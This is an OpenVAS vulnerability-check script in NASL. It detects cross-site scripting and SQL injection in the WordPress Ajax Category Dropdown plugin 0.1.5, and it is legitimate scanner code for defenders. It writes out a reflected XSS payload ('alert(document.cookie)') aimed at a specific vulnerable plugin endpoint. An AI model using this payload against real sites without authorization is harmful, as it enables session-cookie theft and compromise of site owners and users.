###############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_wordpress_category_dropdown_plugin_xss_n_sql_inj_vuln.nasl 10235 2018-06-18 13:14:33Z cfischer $
#
# WordPress Ajax Category Dropdown Plugin Cross Site Scripting and SQL Injection Vulnerabilities
#
# Authors:
# Sooraj KS <kssooraj@secpod.com>
#
# Copyright:
# Copyright (c) 2011 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:wordpress:wordpress";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.902505");
  script_version("$Revision: 10235 $");
  script_tag(name:"last_modification", value:"$Date: 2018-06-18 15:14:33 +0200 (Mon, 18 Jun 2018) $");
  script_tag(name:"creation_date", value:"2011-05-02 12:20:04 +0200 (Mon, 02 May 2011)");
  script_bugtraq_id(47529);
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_name("WordPress Ajax Category Dropdown Plugin Cross Site Scripting and SQL Injection Vulnerabilities");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2011 SecPod");
  script_family("Web application abuses");
  script_dependencies("secpod_wordpress_detect_900182.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("wordpress/installed");

  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/view/100686/ajaxcdwp-sqlxss.txt");
  script_xref(name:"URL", value:"http://www.htbridge.ch/advisory/xss_in_ajax_category_dropdown_wordpress_plugin.html");
  script_xref(name:"URL", value:"http://www.htbridge.ch/advisory/multiple_sql_injection_in_ajax_category_dropdown_wordpress_plugin.html");

  script_tag(name:"impact", value:"Successful exploitation could allow an attacker to steal cookie
  -based authentication credentials, compromise the application, access or modify
  data, or exploit latent vulnerabilities in the underlying database.

  Impact Level: Application");

  script_tag(name:"affected", value:"WordPress Ajax Category Dropdown Plugin version 0.1.5");

  script_tag(name:"insight", value:"The flaw is due to failure in the '/wp-content/plugins/
  ajax-category-dropdown/includes/dhat-ajax-cat-dropdown-request.php' script to
  properly sanitize user-supplied input.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore.
  General solution options are to upgrade to a newer release, disable respective
  features, remove the product or replace the product by another one.");

  script_tag(name:"summary", value:"This host is running WordPress Ajax Category Dropdown Plugin
  and is prone to cross site scripting and SQL injection vulnerabilities.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"WillNotFix");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if(!port = get_app_port(cpe:CPE))exit(0);
if(!dir = get_app_location(cpe:CPE, port:port))exit(0);

if(dir == "/") dir = "";
url = string(dir, '/wp-content/plugins/ajax-category-dropdown/includes/dhat-ajax-cat-dropdown-request.php?admin&category_id="><script>alert(document.cookie);</script>');

if(http_vuln_check(port:port, url:url, check_header:TRUE, pattern:"<script>alert\(document\.cookie\);</script>")) {
  report = report_vuln_url(port:port, url:url);
  security_message(port:port, data:report);
  exit(0);
}

exit(99);